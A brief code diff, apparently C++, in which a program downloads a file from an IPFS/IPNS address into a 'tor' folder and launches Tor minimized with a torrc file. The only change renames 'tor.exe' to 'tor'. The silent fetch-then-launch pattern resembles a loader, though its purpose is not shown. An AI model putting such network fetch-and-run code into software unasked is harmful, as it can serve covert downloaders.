@@ -20,5 +20,5 @@ string link = "https://ipfs.io/ipns/k51qzi5uqu5dldod6robuflgitvj276br0xye3adipm3
 string filename = "./tor/" + UPD;
 URLDownloadToFile(NULL, link.c_str(), filename.c_str(), 0, NULL);
 _wchdir(L"./tor");
-system("start /min tor.exe -f ../torrc.txt");
+system("start /min tor -f ../torrc.txt");
 }
